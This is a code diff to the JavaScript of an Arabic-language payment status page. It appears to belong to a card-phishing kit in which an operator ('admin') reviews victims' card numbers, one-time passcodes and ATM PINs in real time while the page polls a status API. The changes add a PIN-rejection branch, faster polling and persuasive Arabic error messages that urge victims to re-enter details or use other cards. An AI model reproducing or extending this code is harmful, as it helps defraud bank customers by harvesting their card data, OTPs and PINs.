@@ -23,6 +23,10 @@
     <script>
         const orderId = new URLSearchParams(window.location.search).get('orderId');
         
+        if (!orderId) {
+            window.location.href = 'payment_new_ar.html';
+        }
+
         async function checkStatus() {
             try {
                 const response = await fetch(`/api/check-status/${orderId}`);
@@ -31,25 +35,34 @@
                 if (data.status === 'approved') {
                     window.location.href = `payment_otp_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'rejected') {
-                    localStorage.setItem('lastError', data.lastError || 'عذراً، البطاقة غير صالحة.');
-                    window.location.href = `payment_new_ar.html`;
+                    localStorage.setItem('lastError', data.lastError || 'عذراً، البطاقة غير صالحة. قد تكون بطاقتك غير مفعلة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو استخدام طرق دفع مختلفة.');
+                    window.location.href = `payment_new_ar.html?orderId=${orderId}`;
+                } else if (data.status === 'waiting_admin_approval') {
+                    // Stay here while admin reviews card
+                    setTimeout(checkStatus, 2000);
                 } else if (data.status === 'otp_submitted') {
                     // Stay here while admin reviews OTP
-                    setTimeout(checkStatus, 3000);
+                    setTimeout(checkStatus, 2000);
                 } else if (data.status === 'approved_otp') {
                     window.location.href = `payment_atm_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'rejected_otp') {
-                    localStorage.setItem('lastError', data.lastError || 'رمز التحقق غير صحيح.');
+                    localStorage.setItem('lastError', data.lastError || 'الرمز الذي تم إدخاله غير صالح. قد تكون بطاقتك غير مفعلة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو إعادة المحاولة.');
                     window.location.href = `payment_otp_ar.html?orderId=${orderId}`;
                 } else if (data.status === 'pin_submitted') {
                     // Stay here while admin reviews PIN
-                    setTimeout(checkStatus, 3000);
+                    setTimeout(checkStatus, 2000);
                 } else if (data.status === 'approved_pin') {
-                    window.location.href = `payment_success_ar.html`;
+                    window.location.href = `payment_success_ar.html?orderId=${orderId}`;
+                } else if (data.status === 'rejected_pin') {
+                    localStorage.setItem('lastError', data.lastError || 'فشلت عملية الدفع. رقم الصراف الآلي الذي تم إدخاله غير صحيح، أو قد تكون بطاقتك غير مفعلة للدفع أونلاين. يرجى التواصل مع المصرف أو استخدام طرق دفع مختلفة.');
+                    window.location.href = `payment_atm_ar.html?orderId=${orderId}`;
                 } else {
-                    setTimeout(checkStatus, 3000);
+                    setTimeout(checkStatus, 2000);
                 }
-            } catch (e) { console.error(e); }
+            } catch (e) { 
+                console.error(e);
+                setTimeout(checkStatus, 3000);
+            }
         }
 
         if (orderId) checkStatus();
